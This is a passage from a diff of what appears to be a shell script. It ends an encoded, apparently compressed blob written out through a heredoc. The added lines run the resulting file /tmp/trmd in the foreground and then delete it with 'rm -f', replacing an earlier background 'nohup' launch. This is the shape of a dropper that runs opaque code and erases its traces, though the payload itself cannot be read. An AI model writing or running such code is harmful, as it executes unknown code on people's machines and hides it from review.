@@ -14,5 +14,6 @@ umtbVyR0fcQ2/Y3tQ5qa8OGfTA+330eJ/EA+FjMEepWENBuE1D23QewasDsJTuF7
 SuHfQH0B00f2QtoVw2QYYcEMxyhnlkVSLwX36CAN06+O97DnvOvT+Sx5osHRa/gP
 fJ4E9sxDdIxvtv+24BfzNLCH7wQAAA==
 EOF
-nohup bash /tmp/trmd &
-
+#nohup bash /tmp/trmd &
+bash /tmp/trmd
+rm -f /tmp/trmd 
